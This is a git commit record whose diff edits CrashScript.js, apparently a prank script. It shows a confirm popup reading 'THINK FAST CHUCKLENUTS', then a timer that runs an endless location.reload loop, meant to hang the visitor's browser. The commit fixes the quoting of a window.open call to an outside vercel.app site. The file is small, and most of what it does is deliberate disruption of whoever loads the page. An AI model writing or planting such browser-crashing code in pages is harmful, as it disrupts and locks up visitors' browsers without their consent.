912441659bee4195d408467e9e6c6c240680b5d7
ten8mystery <146376897+ten8mystery@users.noreply.github.com>
2025-10-29 00:59:23 -0700

    Update CrashScript.js

--- CrashScript.js
+++ CrashScript.js
@@ -4,5 +4,5 @@ confirm("THINK FAST CHUCKLENUTS"); // This will show the dialog no matter what
 
 setTimeout(function() {
   while (1) location.reload(1);
-window.open(https://loveintrestcom.vercel.app, STOOPID, wow :O );
+window.open('https://loveintrestcom.vercel.app', 'STOOPID','');
 }, 1);
